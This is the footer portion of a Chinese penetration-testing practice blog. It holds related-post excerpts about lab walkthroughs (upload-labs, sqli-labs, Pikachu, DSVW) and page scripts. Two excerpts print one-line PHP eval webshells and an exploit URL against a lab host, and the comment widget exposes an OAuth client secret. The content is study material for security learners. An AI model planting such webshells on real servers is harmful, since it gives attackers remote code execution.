							</p>
							<p class="relate-post-content">
								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
Pass-01任务：上传一个webshell到服务器
直接怼，显示：

改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
								PHP-Web渗透中常见的高危函数以及伪协议			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								五月 4日, 2023				
							</p>
							<p class="relate-post-content">
								代码执行函数eval
代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
利用：http://10.10.10.3/test.php?cmd=phpinfo();
assert
代码：&lt;?...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
								Webshell流量分析			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								五月 1日, 2023				
							</p>
							<p class="relate-post-content">
								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
用的某个工具包里的菜刀，流量如下：

agent有火狐5.0以及百度
连接密码开头，用了array_map封装命令执行函数，...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
								sqli-labs Stacked Injections			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 30日, 2023				
							</p>
							<p class="relate-post-content">
								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
								Web靶场-DSVW			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 25日, 2022				
							</p>
							<p class="relate-post-content">
								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
最新版本v0.2b用Python 3运行代码很顶...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
								Web靶场-Pikachu			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十月 6日, 2022				
							</p>
							<p class="relate-post-content">
								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
								一些BurpSuite进阶使用			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								五月 10日, 2022				
							</p>
							<p class="relate-post-content">
								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
后续再考虑找些专门的教程学学
使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
来自于g0tmi1k的文章
...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">
								SQL与sqlmap			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								一月 13日, 2022				
							</p>
							<p class="relate-post-content">
								[NOTE] SQL与sqlmapSQL语法order by

对查询结果排序
ASC：升序（默认）、DESC：降序
SQL注入中多在成功查询之后添加order by i来猜解回显的字段数
如XXX/?id=1&#39; order ...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="SQL与sqlmap"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">
								sqli-labs Adv Injections			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十二月 18日, 2021				
							</p>
							<p class="relate-post-content">
								[NOTE] sqli-labs Adv Injections前言针对sqli-labs靶场的做题笔记
环境虚拟机环境攻击机：kali|10.10.10.1靶机：ubuntu|10.10.10.2|Apache+PHP+MySQL
L...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Adv Injections"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">
								Web靶场-Web For Pentester			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								十二月 17日, 2021				
							</p>
							<p class="relate-post-content">
								[NOTE] Web For Pentester靶场练习笔记前言搞完XVWA之后
环境hacker: Kali Linux | 192.168.10.1&#x2F;10.10.10.1server: Debian 6 | 192.16...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Web For Pentester"/>
							</a>
						</div>
					</li>												
			
		</ul>
	
</div>	
				</div>
				<div class="investment-content-list">
					<div class="layout-comment">

	

		

			<!-- gitalk comment -->
			<!-- show gitalk comment -->
<div id="gitalk-container"></div>

<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">

	(function gitalkComment(){
		//Thanks O-R
		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
		//去除尾部匹配正则数组的字符串  
		//Remove redundant characters
		String.prototype.trimEnd = function(regStr) {
			let result = this;
			if(regStr == undefined || regStr == null || regStr == "") {
				return result;
			}
			let array = regStr.split(',');

			if(array.length > 0) {

				let c = array.shift(), 
					str = this,
					i = str.length,
					rg = new RegExp(c),
					matchArr = str.match(rg);

				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
					matchStr = matchStr + '$';
					result = str.replace(new RegExp(matchStr), "");
				}

				if(array.length > 0) {
					return result.trimEnd(array.join())
				} else {
					return result;
				}
			}
		};

		//Create gitalk
		let gitalk = new Gitalk({
			clientID: 'Ov23liAb4iwJ1VAXeknf',
			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
			//id: window.location.pathname,
			//id: decodeURI(window.location.pathname),
			//id: (window.location.pathname).split("/").pop().substring(0, 49),
			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
			repo: 'Blog-Gitalk',
			owner: 'ArcheriShade',
			admin: 'ArcheriShade',
			distractionFreeMode: 'true',
		})
		gitalk.render('gitalk-container');		
	})();
</script>

		
		
	

</div>
				</div>
				<!-- <div class="investment-content-list">
					<div class="layout-share">
	
	
		<div class="config-info">
			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
		</div>	
	
</div>


				</div> -->
			</div>	
		</div>
	</div>
</div>

<!-- show math formula -->



	 
	
<script src="/plugin/clipboard/clipboard.js"></script>

	<script>
		// Copy code !
	    function preprocessing() {
	        $("#article-content .highlight").each(function() {
	            $(this).wrap('<div id="post-code"></div>');
	        })

	        $("#article-content #post-code").each(function() {
	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
	        })

	        $("#article-content .copy-nav").each(function() {
	            let languageClass = $(this).next().attr('class'),
	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?

	            $(this).find('.code-language').text(language);
	            $(this).append('<span class="copy-btn icon-paste"></span>');
	        });
	    }

		function copy() {
		    $('#article-content #post-code').each(function(i) {
		        let codeCopyId = 'codeCopy-' + i;

		        let codeNode = $(this).find('.code'),
		            copyButton = $(this).find('.copy-btn');

		        codeNode.attr('id', codeCopyId);
		        copyButton.attr('data-clipboard-target-id', codeCopyId);
		    })
   
			let clipboard = new ClipboardJS('.copy-btn', {
					target: function(trigger) {
						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
					}
		      	});

			//pure js
			function showTooltip(elem, msg) {		   
				elem.setAttribute('aria-label', msg);
				elem.setAttribute('class', 'copy-btn icon-clipboard1');
				setTimeout(function() {
					elem.setAttribute('class', 'copy-btn icon-paste');
				}, 2000);
			}

			clipboard.on('success', function(e) {
			    e.clearSelection();
			    console.info('Action:', e.action);		   
			    console.info('Trigger:', e.trigger);
			    showTooltip(e.trigger, 'Copied!');   
			});
			
			clipboard.on('error', function(e) {
			    console.error('Action:', e.action);
			    console.error('Trigger:', e.trigger);
			});
		}
		
		(function copyCode(){
			if ($('.layout-post').length) {
			    preprocessing();
			    copy();
			} 
		})();
	</script>






<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">


<script src="/plugin/fancybox/jquery.fancybox.js"></script>


<script type="text/javascript">
	(function gallerySet(){
		let titleID = $('.article-title a'),
			imageID = $('.article-content img'),
			videoID = $('.article-content video');
		
		let postTitle = titleID.text() ? titleID.text() : "No post title!";
		
		imageID.each(function() {
			let imgPath = $(this).attr('src'),
				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
		});
		
		videoID.each(function() {
			let videoPath = $(this).attr('src');
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
		});
		
		//TODO：支持html5 video

		if($('#layout-post').length) {
			$('[data-fancybox="gallery"]').fancybox({
				loop: true,
				buttons: [
					"zoom",
					"share",
					"slideShow",
					"fullScreen",
					//"download",
					"thumbs",
					"close"
				],
				protect: true
			});
		}
	})();
</script>
		</main>

		<!--footer-->
		<footer>
	<div id="navigation-show">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
	</div>

	<div class="copyright">
		<p>
			 
				&copy;2024, content by ArcheriShade. All Rights Reserved.
			
			
				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
			
		</p>
		<p>
			

	<!-- busuanzi -->
	<!-- busuanzi -->



			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
		</p>
	</div>		
</footer>
		
	<!-- Local or hitokoto! -->

	
<script src="/plugin/motto/motto.js"></script>

	
	<script type="text/javascript">
		(function motto(){
			let mottoText = getMingYanContent().split('</br> - </br>'),
			
			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
			
			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
			
			mottoTextContent = mottoTextContent.trim().substring(0, 100);
		
			$("#motto-content").html( mottoTextContent);
			$("#motto-author").html( mottoTextFrom  );
		})();	
	</script>	



<!-- love effect -->


<!-- back to top -->

	<div id="totop">
	<span class="icon-circle-up"></span>
</div>



<!-- site analysis -->


	<!-- site-analysis -->
	
	
	
	
	
 

<!-- leancloud -->


	<!-- leancloud -->
	<!--
	时间：2018-11-27
	描述：
		文章访问量：visitors
		文章喜欢量：likes	
		文章排行榜：topNPost
		其他得说明：
			01-Cookie相关的函数 
				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
			02-visitors相关的函数 
				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
			03-topNPost相关的函数
				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
			04-likes相关的函数，
				参考了01 & 02进行简单的设计与实现
-->


	

  

	<!--
	时间：2018-10-3
	描述：
		插件名称：hexo-generator-search-zip
		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
-->
<div class="popup search-popup local-search-popup scrollbar" >
	<div class="local-search-container">
		<span class="popup-btn-close">
      		ESC
   		</span>
		<div class="local-search-header">
			<div class="input-prompt">				
			</div>
			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
		</div>
		<div class="local-search-body">
			<div id="local-search-output"></div>
		</div>
		<div class="local-search-footer">
			<div class="topN-post">				
				
								
			</div>
		</div>
	</div>
</div>


<script src="/plugin/search/ziploader.js"></script>
<script src="/js/search.js"></script>


<script type="text/javascript">
	var search_path = 'search.json',
		zip_Path = '/search.zip',
		version_Path = '/searchVersion.txt',
		input_Trigger = 'auto',
		top_N = '2';

	themeLocalSearch({
		search_path, 
		zip_Path, 
		version_Path, 
		input_Trigger, 
		top_N
	});
</script>



<script src="/plugin/chinese/chinese.js"></script>
<script src="/plugin/imagelazyloader/yall.min.js"></script>
<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
<script src="/plugin/resizediv/resizediv.js"></script>
<script src="/js/main.js"></script>

	</body>	
</html>